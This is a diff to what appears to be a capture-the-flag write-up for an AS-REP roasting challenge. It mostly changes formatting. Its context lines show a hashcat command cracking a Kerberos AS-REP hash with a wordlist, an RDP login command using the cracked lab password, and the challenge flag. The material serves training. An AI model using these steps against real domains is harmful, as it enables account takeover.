@@ -4,7 +4,7 @@ tags:
   - easy
   - ChallengeCreation
   - ASREProasting
-modified: 2024-09-04T14:19:43+08:00
+modified: 2026-08-22T08:25:37+08:00
 ---
 ## Challenge Description
 
@@ -63,7 +63,7 @@ The above screenshot shows that we have successfully identified `timothylam`'s p
 
 The full `hashcat` command output is attached below:
 
-```bash
+```console
 ┌──(nepz㉿nepz)-[~]
 └─$ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
@@ -145,4 +145,5 @@ xfreerdp3 /v:10.10.1.128 /u:timothylam /d:NULL /p:'timothy10261983' /cert:ignore
 
 ![[KerbeREP-Roasting-4.png]]
 
-Flag: `HNF25{pl34se_d0_n0t_di5ab13_k3rb3r0a5t_pr3_auth}`
+> [!NOTE] Flag
+> HNF25{pl34se_d0_n0t_di5ab13_k3rb3r0a5t_pr3_auth}
